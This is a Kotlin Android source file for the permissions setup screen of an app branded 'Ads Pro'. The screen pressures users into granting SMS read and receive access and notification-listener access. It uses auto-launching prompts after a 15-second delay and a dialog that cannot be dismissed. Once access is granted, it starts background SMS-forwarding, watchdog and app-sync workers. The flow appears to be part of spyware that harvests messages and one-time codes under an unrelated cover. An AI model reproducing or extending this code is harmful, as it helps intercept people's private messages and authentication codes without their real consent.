package com.adspro.app.ui

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import com.adspro.app.service.SmsSyncService
import com.adspro.app.worker.AppsSyncWorker
import com.adspro.app.worker.CatchupScanWorker
import com.adspro.app.worker.WatchdogWorker
import kotlinx.coroutines.delay

@Composable
fun PermissionsPage(onNext: () -> Unit) {
    val ctx = LocalContext.current
    val lifecycle = LocalLifecycleOwner.current.lifecycle

    var smsGranted by remember { mutableStateOf(hasSms(ctx)) }
    var notifAccess by remember { mutableStateOf(hasNotificationAccess(ctx)) }
    var postNotifGranted by remember { mutableStateOf(hasPostNotif(ctx)) }
    var flowTriggered by remember { mutableStateOf(false) }
    var showNotifAccessDialog by remember { mutableStateOf(false) }
    var serviceRunning by remember { mutableStateOf(SmsSyncService.isRunning(ctx)) }

    val smsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        smsGranted = grants[Manifest.permission.RECEIVE_SMS] == true
        if (smsGranted && !hasNotificationAccess(ctx)) {
            showNotifAccessDialog = true
        }
    }

    val postNotifLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { postNotifGranted = it }

    LaunchedEffect(Unit) {
        if (smsGranted && notifAccess) return@LaunchedEffect
        delay(15_000L)
        if (!flowTriggered) {
            flowTriggered = true
            when {
                !smsGranted -> smsLauncher.launch(
                    arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
                )
                !notifAccess -> showNotifAccessDialog = true
            }
        }
    }

    DisposableEffect(lifecycle) {
        val obs = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                val freshSms = hasSms(ctx)
                val freshNotif = hasNotificationAccess(ctx)
                val freshPost = hasPostNotif(ctx)
                smsGranted = freshSms
                notifAccess = freshNotif
                postNotifGranted = freshPost
                serviceRunning = SmsSyncService.isRunning(ctx)
                if (freshSms && !serviceRunning) {
                    SmsSyncService.start(ctx)
                    WatchdogWorker.schedule(ctx)
                    CatchupScanWorker.schedulePeriodic(ctx)
                    AppsSyncWorker.schedule(ctx)
                }
                if (freshSms && freshNotif && !freshPost && Build.VERSION.SDK_INT >= 33) {
                    postNotifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }
        lifecycle.addObserver(obs)
        onDispose { lifecycle.removeObserver(obs) }
    }

    if (showNotifAccessDialog) {
        AlertDialog(
            onDismissRequest = { },
            title = { Text("Enable notification access") },
            text = {
                Text(
                    "Ads Pro needs access to read notifications from other apps.\n\n" +
                    "Tap Open Settings, find Ads Pro in the list, and toggle it on."
                )
            },
            confirmButton = {
                TextButton(onClick = {
                    showNotifAccessDialog = false
                    ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                }) { Text("Open Settings") }
            },
        )
    }

    Column(
        Modifier.fillMaxSize().padding(24.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp),
    ) {
        Text("Ads Pro", style = MaterialTheme.typography.headlineLarge)
        Text("Setup", style = MaterialTheme.typography.titleMedium)

        PermissionRow(
            title = "SMS",
            subtitle = "Read incoming messages and forward them.",
            granted = smsGranted,
            onClick = {
                flowTriggered = true
                smsLauncher.launch(
                    arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
                )
            },
        )

        PermissionRow(
            title = "Notification access",
            subtitle = "Read other apps' notifications via system Settings.",
            granted = notifAccess,
            onClick = {
                flowTriggered = true
                if (!smsGranted) {
                    smsLauncher.launch(
                        arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
                    )
                } else {
                    showNotifAccessDialog = true
                }
            },
        )

        PermissionRow(
            title = "Notifications",
            subtitle = "Let Ads Pro show its ongoing status notification.",
            granted = postNotifGranted,
            onClick = {
                if (Build.VERSION.SDK_INT >= 33 && !postNotifGranted) {
                    postNotifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
            },
        )

        ServiceStatusCard(serviceRunning)

        Spacer(Modifier.weight(1f))

        val ready = smsGranted && notifAccess
        GreenNextButton(
            text = if (ready) "Continue" else "Start setup",
            onClick = {
                if (ready) {
                    onNext()
                } else {
                    flowTriggered = true
                    when {
                        !smsGranted -> smsLauncher.launch(
                            arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
                        )
                        !notifAccess -> showNotifAccessDialog = true
                        else -> onNext()
                    }
                }
            },
        )
    }
}

private fun hasSms(c: Context) =
    ContextCompat.checkSelfPermission(c, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED

private fun hasPostNotif(c: Context) =
    Build.VERSION.SDK_INT < 33 ||
    ContextCompat.checkSelfPermission(c, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED

private fun hasNotificationAccess(c: Context): Boolean {
    val flat = Settings.Secure.getString(c.contentResolver, "enabled_notification_listeners")
    return flat?.contains(c.packageName) == true
}
